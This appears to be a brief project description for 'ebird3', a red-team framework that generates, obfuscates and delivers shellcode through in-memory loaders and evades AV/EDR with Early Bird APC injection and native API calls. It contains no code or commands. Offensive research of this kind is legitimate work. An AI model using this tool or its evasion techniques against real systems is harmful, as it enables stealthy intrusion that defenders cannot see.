  ebird3 is a next-generation, automated framework for generating, obfuscating, and delivering shellcode through in-memory loaders. Designed for red team operations, penetration testing, and offensive research, ebird3 empowers attackers to deploy stealthy, fileless payloads that execute directly in memory â€” bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection and NT Native API Calls.
